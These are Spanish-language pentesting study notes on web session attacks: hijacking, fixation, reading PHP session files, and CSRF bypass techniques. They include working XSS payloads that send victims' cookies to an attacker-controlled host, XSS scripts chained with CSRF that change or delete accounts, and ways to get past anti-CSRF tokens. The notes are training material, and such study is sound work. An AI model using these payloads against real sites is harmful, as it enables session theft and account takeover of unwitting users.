# Session Security

## INTRODUCCION

Una sesión de usuario se puede definir como una secuencia de solicitudes que se originan en el mismo cliente y las respuestas asociadas durante un período de tiempo específico. Las aplicaciones web modernas necesitan mantener sesiones de usuario para realizar un seguimiento de la información y el estado de cada usuario. Las sesiones de usuario facilitan la asignación de derechos de acceso o autorización, configuraciones de localización, etc., mientras los usuarios interactúan con una aplicación, antes y después de la autenticación.

## Seguridad del identificador de sesión


**Un identificador de sesión** único (ID de sesión) o token es la base sobre la cual se generan y distinguen las sesiones de usuario. Debemos aclarar que si un atacante obtiene un identificador de sesión, esto puede resultar en un secuestro de sesión, donde el atacante puede hacerse pasar por la víctima en la aplicación web.

Un atacante puede obtener un identificador de sesión a través de una multitud de técnicas, no todas las cuales incluyen atacar activamente a la víctima. Un identificador de sesión también puede ser:

-   Capturado a través de tráfico pasivo olfateando de paquetes.
-   Identified in logs.
-   Predicted.
-   Brute Forced.

El nivel de seguridad de un identificador de sesión depende de su:

- `Validity Scope` - (un identificador de sesión seguro debe ser válido solo para una sesión)
- `Randomness` - (Se debe generar un identificador de sesión seguro a través de un algoritmo robusto de generación de cadenas/números aleatorios para que no se pueda predecir)
- `Validity Time` - (un identificador de sesión seguro debe caducar después de un cierto período de tiempo)

## Ataques de sesión

- `Session Hijacking`: En los ataques de secuestro de sesión, el atacante aprovecha los identificadores de sesión inseguros, encuentra una forma de obtenerlos y los usa para autenticarse en el servidor y hacerse pasar por la víctima.
    
- `Session Fixation`: la fijación de sesión se produce cuando un atacante puede fijar un identificador de sesión (válido). Como puede imaginar, el atacante tendrá que engañar a la víctima para que inicie sesión en la aplicación utilizando el identificador de sesión mencionado anteriormente. Si la víctima lo hace, el atacante puede proceder a un ataque de Secuestro de Sesión (ya que el identificador de sesión ya se conoce).
    
- `XSS (Cross-Site Scripting)`: Con un enfoque en las sesiones de usuario
    
- `CSRF (Cross-Site Request Forgery)`: La falsificación de solicitudes entre sitios (CSRF o XSRF) es un ataque que obliga a un usuario final a ejecutar acciones involuntarias en una aplicación web en la que está autenticado actualmente. Este ataque generalmente se monta con la ayuda de páginas web creadas por el atacante que la víctima debe visitar o con las que interactuar. Estas páginas web contienen solicitudes maliciosas que esencialmente heredan la identidad y los privilegios de la víctima para realizar una función no deseada en nombre de la víctima.
    
- `Open Redirects`: Con un enfoque en las sesiones de usuario: una vulnerabilidad de redirección abierta ocurre cuando un atacante puede redirigir a una víctima a un sitio controlado por el atacante abusando de la funcionalidad de redirección de una aplicación legítima. En tales casos, todo lo que el atacante tiene que hacer es especificar un sitio web bajo su control en una URL de redirección de un sitio web legítimo y pasar esta URL a la víctima. Como puedes imaginar, esto es posible cuando la funcionalidad de redirección de la aplicación legítima no realiza ningún tipo de validación con respecto a los sitios web a los que apunta la redirección.

## Session Hijacking

En los ataques de secuestro de sesión, el atacante aprovecha los identificadores de sesión inseguros, encuentra una forma de obtenerlos y los usa para autenticarse en el servidor y hacerse pasar por la víctima.

Un atacante puede obtener el identificador de sesión de una víctima utilizando varios métodos, siendo los más comunes:

-   Rastreo pasivo de tráfico
-   Secuencias de comandos entre sitios (XSS)
-   Historial del navegador o registro de buceo
-   Acceso de lectura a una base de datos que contiene información de la sesión

**EJEMPLO**

1. Iniciamos sesion como un usuario en una pagina
2. revisamos las cookies y encontramos una de sesion llamada **auth-session**
3. imaginamos que somos un atacante y obtuvimos de alguna manera la cookie de session, ahora vamos a la pagina de inicio de sesion en una ventana de incognito
4. definimos una cookie con el mismo nombre y valor
5. al recargar la pagina vamos a ver que iniciamos sesion como un usuario sin conocer sus credenciales.

## Session Fixation

Si cualquier valor o un identificador de sesión válido especificado en el `token`parámetro de la URL se propaga al `PHPSESSID`valor de la cookie, probablemente estemos ante una vulnerabilidad de fijación de sesión.

![[Pasted image 20230126161339.png]]

## OBTENER SESSIONES PHP DESDE EL SERVIDOR

Veamos dónde se almacenan normalmente los identificadores de sesión de PHP.

La entrada `session.save_path` en `PHP.ini` especifica dónde se almacenarán los datos de la sesión.

```bash
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

La configuración por defecto es `/var/lib/php/sessions`. Los archivos que un atacante buscará utilizan la convención de nombres `sess_<sessionID>`.

Ejemplo:

![[Pasted image 20230127135348.png]]

```bash
cat /var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

![[Pasted image 20230127135356.png]]

## Obtención de cookies de sesión a través de XSS

>[!warning]
>Se necesita interaccion del usuario.

Cuando vemos un campo vulnerable a XSS (Sobretodo de tipo almacenado) podemos usar cualquier payload para robar las cokkies y enviarnoslas a un servidor web o por exfilrtacion de DNS:

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

![[Pasted image 20230127141655.png]]

>[!tip]
>Este payload sirve hasta para evadir proteccion en algunos casos.

otros payloads:

```javascript
//envio de la cookie en base64
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

No necesariamente tenemos que usar el `window.location()`objeto que hace que las víctimas sean redirigidas. Podemos usar `fetch()`, que puede obtener datos (cookies) y enviarlos a nuestro servidor sin redireccionamientos. Esta es una forma más sigilosa.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

nos montamos un servidor en python y obtenemos las cookies:

![[Pasted image 20230127142847.png]]


>[!tip]
>Cualquier otro payload que haga lo mismo (enviar cookies por HTTP u otro protocolo) es valido, hay muchos y algunos extraños para evadir WAF.

### PROTECION

>[!note]
>Esto es valido si el token de sesion **se alamcena en las cookies** y dicha cookie tiene el atributo `httponly = false`

![[Pasted image 20230127143407.png]]

## CHAINING XSS + CSRF

Las solicitudes maliciosas entre sitios están fuera de la ecuación debido a las protecciones del mismo origen/mismo sitio. Todavía podemos realizar un ataque CSRF a través de la vulnerabilidad XSS almacenada que existe. Específicamente, aprovecharemos la vulnerabilidad XSS almacenada para emitir una solicitud de cambio de estado contra la aplicación web. ¡Una solicitud a través de XSS omitirá cualquier protección del mismo origen/mismo sitio ya que se derivará del mismo dominio!

Payload XSS:

```javascript
<script>
//primera peticion para obtener el CSRF token
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
	//recuperacion del CSRF Token
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];

	//segunda peticion para realizar el Ataque CSRF pasando el Anti CSRF-Token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Como estamos aprovechando una vulnerabilidad XSS almacenada, al momento de ejecutarse o llamarse realizara una accion dentro de la cuenta del usuario (**Si se encuentra logueado**) sin su consentimiento.

**OTRO EJEMPLO**

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

## Explotación de tokens CSRF débiles

Al evaluar la solidez de un mecanismo de generación de tokens CSRF, asegúrese de dedicar un poco de tiempo a intentar encontrar el mecanismo de generación de tokens CSRF. Puede ser tan fácil como:

- `md5(username)`
- `sha1(username)`
- `md5(current date + username)`

Tenga en cuenta que no debe dedicar mucho tiempo a esto, pero vale la pena intentarlo.

## Additional CSRF Protection Bypasses

### Null Value

Puede intentar convertir el token CSRF en un valor nulo (vacío), por ejemplo:

```bash
CSRF-Token:
```

### Random CSRF Token

Establecer el valor del token CSRF en la misma longitud que el token CSRF original pero con un valor diferente/aleatorio también puede omitir alguna protección anti-CSRF que valida si el token tiene un valor y la longitud de ese valor. Por ejemplo, si el token CSRF tuviera una longitud de 32 bytes, volveríamos a crear un token de 32 bytes.

Verdadero:

`CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331`

Falso:

`CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3`

### Utilizar el token CSRF de otra sesión

Cree dos cuentas e inicie sesión en la primera cuenta. Genere una solicitud y capture el token CSRF. Copie el valor del token, por ejemplo, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`.

### Manipulación del método de solicitud

- Para eludir las protecciones anti-CSRF, podemos intentar cambiar el método de solicitud. De _POST_ a _GET_ y viceversa.

### Elimine el parámetro del token CSRF o envíe un token en blanco

- No enviar un token funciona con bastante frecuencia debido al siguiente error común de lógica de aplicación. A veces, las aplicaciones solo verifican la validez del token si el token existe o si el parámetro del token no está en blanco.

### Protección anti-CSRF a través del encabezado de referencia

Si una aplicación utiliza el encabezado de referencia como mecanismo anti-CSRF, puede intentar eliminar el encabezado de referencia. Agregue la siguiente metaetiqueta a su página que aloja su script CSRF.

`<meta name="referrer" content="no-referrer"`